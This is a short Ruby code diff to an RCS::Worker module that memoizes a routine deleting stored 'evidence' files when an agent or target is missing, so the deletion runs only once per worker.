@@ -87,6 +87,7 @@ module RCS::Worker
     def delete_all_evidence
       trace(:error, "[#{@agent_uid}] Agent or target is missing, deleting all related evidence")
       RCS::Worker::GridFS.delete_by_filename(@agent_uid, "evidence")
+      true
     end
 
     # The log key is passed as a string taken from the db
@@ -97,7 +98,7 @@ module RCS::Worker
 
     def process(grid_ev)
       if !agent?
-        delete_all_evidence
+        @_all_evidence_deleted ||= delete_all_evidence
         return
       end
 
